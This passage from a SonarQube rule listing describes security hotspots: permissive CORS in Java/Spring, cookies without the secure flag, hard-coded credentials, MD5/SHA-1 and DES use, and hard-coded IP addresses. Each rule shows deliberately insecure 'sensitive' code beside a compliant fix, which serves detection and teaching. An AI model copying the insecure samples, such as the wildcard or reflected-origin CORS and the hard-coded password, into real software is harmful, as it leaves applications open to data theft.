security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>
  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>
  <li> Your access control policy is dynamically defined by a user-controlled input like <a
  href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin"><code>origin</code></a> header. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>
  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Java servlet framework:</p>
<pre>
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    resp.setHeader("Content-Type", "text/plain; charset=utf-8");
    resp.setHeader("Access-Control-Allow-Origin", "*"); // Sensitive
    resp.setHeader("Access-Control-Allow-Credentials", "true");
    resp.setHeader("Access-Control-Allow-Methods", "GET");
    resp.getWriter().write("response");
}
</pre>
<p>Spring MVC framework:</p>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html">CrossOrigin</a>
  </li>
</ul>
<pre>
@CrossOrigin // Sensitive
@RequestMapping("")
public class TestController {
    public String home(ModelMap model) {
        model.addAttribute("message", "ok ");
        return "view";
    }
}
</pre>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html">cors.CorsConfiguration</a> </li>
</ul>
<pre>
CorsConfiguration config = new CorsConfiguration();
config.addAllowedOrigin("*"); // Sensitive
config.applyPermitDefaultValues(); // Sensitive
</pre>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html">servlet.config.annotation.CorsConfiguration</a> </li>
</ul>
<pre>
class Insecure implements WebMvcConfigurer {
  @Override
  public void addCorsMappings(CorsRegistry registry) {
    registry.addMapping("/**")
      .allowedOrigins("*"); // Sensitive
  }
}
</pre>
<p>User-controlled origin:</p>
<pre>
public ResponseEntity&lt;String&gt; userControlledOrigin(@RequestHeader("Origin") String origin) {
  HttpHeaders responseHeaders = new HttpHeaders();
  responseHeaders.add("Access-Control-Allow-Origin", origin); // Sensitive

  return new ResponseEntity&lt;&gt;("content", responseHeaders, HttpStatus.CREATED);
}
</pre>
<h2>Compliant Solution</h2>
<p>Java Servlet framework:</p>
<pre>
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    resp.setHeader("Content-Type", "text/plain; charset=utf-8");
    resp.setHeader("Access-Control-Allow-Origin", "trustedwebsite.com"); // Compliant
    resp.setHeader("Access-Control-Allow-Credentials", "true");
    resp.setHeader("Access-Control-Allow-Methods", "GET");
    resp.getWriter().write("response");
}
</pre>
<p>Spring MVC framework:</p>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html">CrossOrigin</a>
  </li>
</ul>
<pre>
@CrossOrigin("trustedwebsite.com") // Compliant
@RequestMapping("")
public class TestController {
    public String home(ModelMap model) {
        model.addAttribute("message", "ok ");
        return "view";
    }
}
</pre>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html">cors.CorsConfiguration</a> </li>
</ul>
<pre>
CorsConfiguration config = new CorsConfiguration();
config.addAllowedOrigin("http://domain2.com"); // Compliant
</pre>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html">servlet.config.annotation.CorsConfiguration</a> </li>
</ul>
<pre>
class Safe implements WebMvcConfigurer {
  @Override
  public void addCorsMappings(CorsRegistry registry) {
    registry.addMapping("/**")
      .allowedOrigins("safe.com"); // Compliant
  }
}
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
public ResponseEntity&lt;String&gt; userControlledOrigin(@RequestHeader("Origin") String origin) {
  HttpHeaders responseHeaders = new HttpHeaders();
  if (trustedOrigins.contains(origin)) {
    responseHeaders.add("Access-Control-Allow-Origin", origin);
  }

  return new ResponseEntity&lt;&gt;("content", responseHeaders, HttpStatus.CREATED);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org</a> - CORS </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">developer.mozilla.org</a> - Same origin policy </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/346">CWE-346 - Origin Validation Error</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/942">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2092">
              java:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>
  <li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">mixed content</a> or not
  (ie HTTPS everywhere or not) </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li>
  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>If you create a security-sensitive cookie in your JAVA code:</p>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);
c.setSecure(false);  // Sensitive: a security-ensitive cookie is created with the secure flag set to false
</pre>
<p>By default the <a href="https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setSecure(boolean)"><code>secure</code></a> flag is set
to <em>false:</em></p>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);  // Sensitive: a security-sensitive cookie is created with the secure flag not defined (by default set to false)
</pre>
<h2>Compliant Solution</h2>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);
c.setSecure(true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag set to true
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/315">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/614">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S2068">
              swift:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
let postData = "username=Steve&amp;password=123456".data(using: .utf8)  // Sensitive
//...
var request = URLRequest(url: url)
request.HTTPBody = postData
</pre>
<h2>Compliant Solution</h2>
<pre>
let postData = "username=\(getEncryptedUser())&amp;password=\(getEncryptedPass())".data(using: .utf8)
//...
var request = URLRequest(url: url)
request.HTTPBody = postData
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S2070">
              swift:S2070
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=swift%3AS4790&rule_key=swift%3AS4790'>S4790</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>
<h3>Noncompliant code example</h3>
<pre>
import CryptoSwift

let bytes:Array&lt;UInt8&gt; = [0x01, 0x02, 0x03]
let digest = input.md5() // Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
import CryptoSwift

let bytes:Array&lt;UInt8&gt; = [0x01, 0x02, 0x03]
let digest = input.sha256() // Compliant
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/328">CWE-328 - Reversible One-Way Hash</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://shattered.io/">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S2278">
              swift:S2278
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=swift%3AS5547&rule_key=swift%3AS5547'>S5547</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
let cryptor = try Cryptor(operation: .encrypt, algorithm: .des, options: .none, key: key, iv: []) // Noncompliant

let crypt = CkoCrypt2()
crypt.CryptAlgorithm = "3des" // Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
let cryptor = try Cryptor(operation: .encrypt, algorithm: .aes, options: .none, key: key, iv: []) // Compliant

let crypt = CkoCrypt2()
crypt.CryptAlgorithm = "aes" // Compliant
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S5547">
              swift:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in CommonCrypto</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import CommonCrypto

let algorithm = CCAlgorithm(kCCAlgorithmDES) // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import Crypto

let sealedBox = try AES.GCM.seal(input, using: key)
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S1313">
              swift:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
let host = Host(address: "192.168.12.42")
</pre>
<h2>Compliant Solution</h2>
<pre>
let host = Host(address: configuration.ipAddress)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=swift:S4790">
              swift:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
import CryptoSwift

let bytes:Array&lt;UInt8&gt; = [0x01, 0x02, 0x03]
let digest = input.md5() // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import CryptoSwift

let bytes:Array&lt;UInt8&gt; = [0x01, 0x02, 0x03]
let digest = input.sha512() // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tsql:S2068">
              tsql:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tsql:S2070">
              tsql:S2070
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=tsql%3AS4790&rule_key=tsql%3AS4790'>S4790</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>
<h3>Noncompliant code example</h3>
<pre>
SELECT HASHBYTES('SHA1', MyColumn) FROM dbo.MyTable;
</pre>
<h3>Compliant solution</h3>
<pre>
SELECT HASHBYTES('SHA2_256', MyColumn) FROM dbo.MyTable;
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/328">CWE-328 - Reversible One-Way Hash</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://shattered.io/">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tsql:S1313">
              tsql:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
SET @IP = '192.168.12.42'; -- Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
SET @IP  = (SELECT ip_address FROM configuration);  -- Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
